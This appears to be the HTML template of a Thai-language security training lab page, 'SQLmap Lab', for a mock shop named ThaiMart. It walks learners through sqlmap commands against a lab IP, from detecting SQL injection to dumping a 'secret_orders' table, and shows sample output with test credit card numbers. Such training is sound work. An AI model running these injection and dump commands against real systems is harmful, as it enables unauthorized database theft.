<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %> | ThaiMart</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
  <style>
    .command-card {
      background: #1e1e1e;
      border-radius: 12px;
      margin-bottom: 1.5rem;
      overflow: hidden;
    }
    .command-header {
      padding: 1rem 1.5rem;
      display: flex;
      align-items: center;
      gap: 1rem;
      border-bottom: 1px solid #333;
    }
    .step-badge {
      font-family: 'Fira Code', monospace;
      font-weight: 600;
      font-size: 0.9rem;
      padding: 0.4rem 0.8rem;
      border-radius: 6px;
      min-width: 70px;
      text-align: center;
      background: #3b82f620;
      color: #3b82f6;
    }
    .step-badge.detect { background: #22c55e20; color: #22c55e; }
    .step-badge.dbs { background: #f59e0b20; color: #f59e0b; }
    .step-badge.tables { background: #8b5cf620; color: #8b5cf6; }
    .step-badge.dump { background: #ef444420; color: #ef4444; }
    .command-desc {
      color: #9ca3af;
      font-size: 0.9rem;
    }
    .command-body {
      padding: 1.5rem;
    }
    .command-code {
      background: #0d0d0d;
      border-radius: 8px;
      padding: 1rem 1.25rem;
      font-family: 'Fira Code', monospace;
      font-size: 0.85rem;
      color: #e5e7eb;
      overflow-x: auto;
      position: relative;
    }
    .command-code .prompt { color: #22c55e; }
    .command-code .flag { color: #60a5fa; }
    .command-code .url { color: #fbbf24; }
    .command-code .string { color: #f472b6; }
    .copy-btn {
      position: absolute;
      top: 0.5rem;
      right: 0.5rem;
      background: #374151;
      border: none;
      color: #9ca3af;
      padding: 0.4rem 0.8rem;
      border-radius: 4px;
      font-size: 0.75rem;
      cursor: pointer;
      transition: all 0.2s;
    }
    .copy-btn:hover {
      background: #4b5563;
      color: #fff;
    }
    .intro-box {
      background: linear-gradient(135deg, var(--secondary) 0%, #2d4a6f 100%);
      border-radius: 12px;
      padding: 2rem;
      color: white;
      margin-bottom: 2rem;
    }
    .intro-box h2 {
      margin-bottom: 0.5rem;
    }
    .intro-box p {
      opacity: 0.9;
      margin-bottom: 1rem;
    }
    .intro-box code {
      background: rgba(255,255,255,0.15);
      padding: 0.2rem 0.5rem;
      border-radius: 4px;
      font-size: 0.9rem;
    }
    .target-box {
      background: #fef3c7;
      border: 2px solid #f59e0b;
      border-radius: 12px;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }
    .target-box h3 {
      color: #b45309;
      margin-bottom: 0.75rem;
    }
    .target-url {
      background: white;
      border: 1px solid #fbbf24;
      border-radius: 8px;
      padding: 1rem;
      font-family: 'Fira Code', monospace;
      font-size: 1rem;
      color: #92400e;
      word-break: break-all;
    }
    .goal-box {
      background: #fee2e2;
      border: 1px solid #ef4444;
      border-radius: 8px;
      padding: 1rem;
      margin-bottom: 2rem;
    }
    .goal-box h4 {
      color: #dc2626;
      margin-bottom: 0.5rem;
    }
    .goal-box p {
      color: #7f1d1d;
      margin: 0;
      font-size: 0.95rem;
    }
    .output-example {
      background: white;
      border-radius: 12px;
      border: 1px solid var(--border);
      overflow: hidden;
    }
    .output-header {
      background: var(--background);
      padding: 0.75rem 1rem;
      font-weight: 600;
      border-bottom: 1px solid var(--border);
    }
    .output-body {
      padding: 1rem;
    }
    .output-body pre {
      background: #1e1e1e;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 8px;
      font-family: 'Fira Code', monospace;
      font-size: 0.8rem;
      overflow-x: auto;
      margin: 0;
    }
  </style>
</head>
<body>
  <header class="header">
    <div class="container header-content">
      <a href="/" class="logo">
        <span class="logo-icon">🛒</span>
        <span class="logo-text">ThaiMart</span>
      </a>
      <nav class="nav">
        <a href="/" class="nav-link">หน้าแรก</a>
        <a href="/lab06" class="nav-link active">SQLmap Lab</a>
      </nav>
      <div class="header-slogan">Security Training</div>
    </div>
  </header>

  <div class="page-header">
    <div class="container">
      <h1 class="page-title">SQLmap Lab</h1>
      <p class="page-subtitle">ใช้ sqlmap เพื่อค้นหาและดึงข้อมูลลับจากฐานข้อมูล</p>
    </div>
  </div>

  <main class="main">
    <div class="container page-content">

      <!-- Introduction -->
      <div class="intro-box">
        <h2>🖥️ ใช้ Terminal ของคุณ</h2>
        <p>Lab นี้ต้องใช้ <code>sqlmap</code> ใน Terminal ด้วยตัวเอง ไม่มีปุ่มให้กด!</p>
        <p>หน้านี้มีช่องโหว่ SQL Injection แบบ Numeric ซึ่ง sqlmap สามารถตรวจจับและ exploit ได้อัตโนมัติ</p>
      </div>

      <!-- Target URL -->
      <div class="target-box">
        <h3>🎯 Target URL</h3>
        <div class="target-url">http://10.10.61.87/lab06?id=1</div>
        <p style="margin-top: 0.75rem; color: #92400e; font-size: 0.9rem;">
          พารามิเตอร์ <code>id</code> มีช่องโหว่ SQL Injection
        </p>
      </div>

      <!-- Goal -->
      <div class="goal-box">
        <h4>🚩 เป้าหมาย</h4>
        <p>ค้นหาตาราง <strong>secret_orders</strong> และดึงข้อมูลบัตรเครดิตปลอมที่ซ่อนอยู่</p>
      </div>

      <!-- Step 1: Detect Injection -->
      <div class="command-card">
        <div class="command-header">
          <span class="step-badge detect">Step 1</span>
          <span class="command-desc">ตรวจหาช่องโหว่ SQL Injection</span>
        </div>
        <div class="command-body">
          <div class="command-code">
            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">--batch</span>
          </div>
          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
            <code>--batch</code> = ตอบ Yes อัตโนมัติทุกคำถาม
          </p>
        </div>
      </div>

      <!-- Step 2: List Databases -->
      <div class="command-card">
        <div class="command-header">
          <span class="step-badge dbs">Step 2</span>
          <span class="command-desc">แสดงรายชื่อฐานข้อมูลทั้งหมด</span>
        </div>
        <div class="command-body">
          <div class="command-code">
            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">--dbs</span> <span class="flag">--batch</span>
          </div>
          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
            <code>--dbs</code> = แสดง databases ทั้งหมด
          </p>
        </div>
      </div>

      <!-- Step 3: List Tables -->
      <div class="command-card">
        <div class="command-header">
          <span class="step-badge tables">Step 3</span>
          <span class="command-desc">แสดงตารางในฐานข้อมูล thaimart</span>
        </div>
        <div class="command-body">
          <div class="command-code">
            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">-D</span> <span class="string">thaimart</span> <span class="flag">--tables</span> <span class="flag">--batch</span>
          </div>
          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
            <code>-D thaimart</code> = เลือกฐานข้อมูล, <code>--tables</code> = แสดงตาราง
          </p>
        </div>
      </div>

      <!-- Step 4: Dump Secret Table -->
      <div class="command-card">
        <div class="command-header">
          <span class="step-badge dump">Step 4</span>
          <span class="command-desc">ดึงข้อมูลจากตาราง secret_orders</span>
        </div>
        <div class="command-body">
          <div class="command-code">
            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">-D</span> <span class="string">thaimart</span> <span class="flag">-T</span> <span class="string">secret_orders</span> <span class="flag">--dump</span> <span class="flag">--batch</span>
          </div>
          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
            <code>-T secret_orders</code> = เลือกตาราง, <code>--dump</code> = ดึงข้อมูลทั้งหมด
          </p>
        </div>
      </div>

      <!-- Expected Output -->
      <div class="output-example">
        <div class="output-header">📤 ตัวอย่างผลลัพธ์ที่ควรได้ (Step 4)</div>
        <div class="output-body">
          <pre>Database: thaimart
Table: secret_orders
[3 entries]
+----+------------------+------------------+------------+
| id | customer_name    | credit_card      | amount     |
+----+------------------+------------------+------------+
| 1  | John Doe         | 4111111111111111 | 15000.00   |
| 2  | Jane Smith       | 5500000000000004 | 8500.00    |
| 3  | Bob Wilson       | 340000000000009  | 25000.00   |
+----+------------------+------------------+------------+</pre>
        </div>
      </div>

      <!-- Additional Commands -->
      <div class="card mt-2">
        <div class="card-header">📚 คำสั่งเพิ่มเติม</div>
        <div class="card-body">
          <p style="font-size: 0.9rem; margin-bottom: 0.75rem;">
            <strong>ดูคอลัมน์ในตาราง:</strong>
          </p>
          <code style="background: #f1f5f9; padding: 0.5rem; display: block; border-radius: 4px; font-size: 0.85rem; margin-bottom: 1rem;">
            sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders --columns --batch
          </code>
          <p style="font-size: 0.9rem; margin-bottom: 0.75rem;">
            <strong>ดึงข้อมูลเฉพาะคอลัมน์:</strong>
          </p>
          <code style="background: #f1f5f9; padding: 0.5rem; display: block; border-radius: 4px; font-size: 0.85rem; margin-bottom: 1rem;">
            sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders -C credit_card --dump --batch
          </code>
          <p style="font-size: 0.9rem; margin-bottom: 0.75rem;">
            <strong>เพิ่มความเร็ว:</strong>
          </p>
          <code style="background: #f1f5f9; padding: 0.5rem; display: block; border-radius: 4px; font-size: 0.85rem;">
            sqlmap -u "http://10.10.61.87/lab06?id=1" --dbs --batch --threads=10
          </code>
        </div>
      </div>

      <!-- Test the Page -->
      <div class="card mt-2">
        <div class="card-header">🔍 ทดสอบหน้าเว็บเป้าหมาย</div>
        <div class="card-body">
          <p style="font-size: 0.9rem; margin-bottom: 1rem;">
            คลิกลิงก์ด้านล่างเพื่อดูหน้าเว็บที่มีช่องโหว่ (สังเกต URL parameter <code>id</code>)
          </p>
          <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
            <a href="/lab06?id=1" target="_blank" class="btn btn-primary btn-sm">id=1 (ปกติ)</a>
            <a href="/lab06?id=2" target="_blank" class="btn btn-secondary btn-sm">id=2 (ปกติ)</a>
            <a href="/lab06?id=1'" target="_blank" class="btn btn-danger btn-sm">id=1' (Error)</a>
          </div>
        </div>
      </div>

    </div>
  </main>

  <footer class="footer">
    <div class="container">
      <div class="footer-content">
        <p class="footer-text">© 2569 ThaiMart Security Training</p>
      </div>
    </div>
  </footer>

  <script>
    function copyCommand(btn) {
      const codeBlock = btn.parentElement;
      const text = codeBlock.innerText.replace('Copy', '').replace('$', '').trim();
      navigator.clipboard.writeText(text);
      btn.textContent = 'Copied!';
      setTimeout(() => btn.textContent = 'Copy', 2000);
    }
  </script>
</body>
</html>
